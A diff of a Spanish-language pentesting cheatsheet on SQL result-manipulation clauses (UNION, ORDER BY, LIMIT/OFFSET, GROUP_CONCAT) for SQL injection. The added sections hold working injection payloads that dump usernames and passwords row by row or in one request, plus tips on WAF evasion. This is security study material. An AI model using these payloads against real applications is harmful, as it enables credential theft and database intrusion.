@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/cheatsheet
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: CheatSheet
 linked:
-  - "[[SQL Commands]]"
+  - '[[SQL Commands]]'
 ---
 # SQL - Manipulación de Resultados
 
@@ -19,22 +19,54 @@ linked:
 
 ## Cheatsheet
 
-|              **Concepto Clave**              |          **Sintaxis Básica**          |                                               **Ejemplo Práctico**                                               | **Propósito y Comportamiento**                                                                                                                                                                                 |
-| :------------------------------------------: | :-----------------------------------: | :--------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-|            <br>**Operador UNION**            |   <br>`SELECT ... UNION SELECT ...`   |                      <br>`SELECT email FROM clientes UNION SELECT email FROM proveedores;`                       | <br>Combina resultados de dos `SELECT`. Técnica principal para exfiltrar datos. Exige estrictamente que ambas consultas tengan la misma cantidad y tipo de columnas.<br><br>                                   |
-|          <br>**Operador UNION ALL**          | <br>`SELECT ... UNION ALL SELECT ...` |              <br>`SELECT id_factura FROM ventas_2025 UNION ALL SELECT id_factura FROM ventas_2026;`              | <br>Igual que `UNION`, pero no elimina duplicados. Al no requerir filtrado interno, es más rápido y garantiza la extracción total de registros sin pérdidas.<br><br>                                           |
-|          <br>**Cláusula ORDER BY**           |  <br>`ORDER BY columna [ASC\|DESC]`   |                        <br>`SELECT nombre, salario FROM empleados ORDER BY salario DESC;`                        | <br>Ordena resultados. Invaluable para enumerar columnas dinámicamente: incrementar el índice numérico hasta forzar un error revela cuántas columnas tiene la consulta original.<br><br>                       |
-|          <br>**Cláusula GROUP BY**           |        <br>`GROUP BY columna`         |           <br>`SELECT departamento, COUNT(*) as cant_empleados FROM empleados GROUP BY departamento;`            | <br>Agrupa filas idénticas. Su manipulación permite desencadenar errores descriptivos (ej. colisiones con `floor()` y `rand()`) para revelar la estructura o datos internos.<br><br>                           |
-|           <br>**Cláusula HAVING**            |     <br>`HAVING condicion_logica`     |    <br>`SELECT departamento, SUM(salario) FROM empleados GROUP BY departamento HAVING SUM(salario) > 500000;`    | <br>Filtra los grupos creados por `GROUP BY`. Sirve como una alternativa táctica excelente para aplicar lógica condicional cuando un WAF te bloquea el uso de `WHERE`.<br><br>                                 |
-| <br>**Cláusula LIMIT** y **Cláusula OFFSET** |        <br>`LIMIT n OFFSET m`         | <br>`SELECT * FROM productos ORDER BY id ASC LIMIT 10 OFFSET 20;` _(Muestra los productos del 21 al 30)_<br><br> | <br>`LIMIT` restringe la cantidad de filas devueltas y `OFFSET` define desde dónde empezar. Indispensables para exfiltrar datos iterativamente (fila por fila) cuando la web solo muestra un registro.<br><br> |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `SELECT a FROM t1 UNION SELECT b FROM t2` | Combina dos resultados — base de Union-based SQLi | [[SQLi - Union based]]. Misma cantidad y tipo de columnas obligatorio. |
+| `SELECT a FROM t1 UNION ALL SELECT b FROM t2` | UNION sin deduplicar — más rápido, no pierde filas duplicadas | Exfil máximo sin pérdida. |
+| `ORDER BY 1` (incrementar hasta error) | Cantidad de columnas | Pre-UNION discovery. |
+| `ORDER BY 1 ASC` / `DESC` | Orden ascendente/descendente | Standard. |
+| `GROUP BY column` | Agrupa filas idénticas | MySQL bug `floor(rand(0)*2)` chain genera errores con data. |
+| `HAVING SUM(salary) > 500000` | Filtro sobre grupos (post-GROUP BY) | Alt a `WHERE` si está filtrado por WAF. |
+| `LIMIT 10 OFFSET 20` (MySQL/PG) | Filas 21-30 | Iterar exfil 1-fila-a-la-vez. |
+| `LIMIT 20,10` (MySQL shorthand) | Mismo que arriba | Sintaxis MySQL más corta. |
+| `TOP 10` (MSSQL) | Equivalente a LIMIT en MSSQL | Backend MSSQL. |
+| `ROWNUM <= 10` (Oracle) | Equivalente a LIMIT en Oracle | Backend Oracle. |
+| `FETCH FIRST 10 ROWS ONLY` (ANSI) | Equivalente moderno ANSI | PostgreSQL/Oracle 12c+/DB2. |
+| `SELECT DISTINCT column FROM t` | Valores únicos en columna | Enum de valores sin duplicados. |
+| `GROUP_CONCAT(col SEPARATOR ',')` (MySQL) | Múltiples filas en una sola string | Cuando frontend solo refleja 1 fila. |
+| `STRING_AGG(col, ',')` (PostgreSQL/MSSQL 2017+) | Equivalente PostgreSQL/MSSQL | Mismo uso. |
+| `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` (Oracle) | Equivalente Oracle | Mismo uso. |
 ^sql-resultados
 
+### Iteración LIMIT/OFFSET para exfil
+
+```sql
+-- Iterar 1 fila por request
+' UNION SELECT username,password FROM users LIMIT 0,1-- -
+' UNION SELECT username,password FROM users LIMIT 1,1-- -
+' UNION SELECT username,password FROM users LIMIT 2,1-- -
+```
+
+### GROUP_CONCAT para dump completo en 1 request
+
+```sql
+-- Cuando frontend solo refleja primera fila
+' UNION SELECT group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users-- -
+-- 0x3a = ':', 0x0a = '\n' (separadores en hex para evitar quote escape)
+```
 
 ___
 
 ## Overview
 
-Controlar la forma en que el motor de base de datos formatea, combina y pagina la información es fundamental para la estructuración y recuperación precisa de los datos. En un contexto de evaluación de seguridad, dominar la manipulación de resultados me otorga la capacidad de anexar información ajena a la consulta original, descubrir la topología interna de las tablas mediante inferencia de ordenamiento y exfiltrar registros de manera secuencial y controlada, superando así las limitaciones visuales de la interfaz de la aplicación.
+Manipulación de resultados = control de **qué** y **cómo** se devuelve. Clave en SQLi para:
 
+- **`UNION`**: anexar data ajena a query original (base de Union-based).
+- **`ORDER BY`**: enumerar columnas (preq para UNION).
+- **`GROUP_CONCAT`/`STRING_AGG`**: dump completo en 1 fila reflejada.
+- **`LIMIT`/`OFFSET`**: iterar registros cuando frontend solo muestra 1.
+- **`GROUP BY` + `floor(rand())`**: trigger errores verbose en MySQL legacy.
 
-___
+Diferencias de sintaxis críticas: `LIMIT` (MySQL/PG) vs `TOP` (MSSQL) vs `ROWNUM` (Oracle) vs `FETCH FIRST` (ANSI moderno).
+
+***
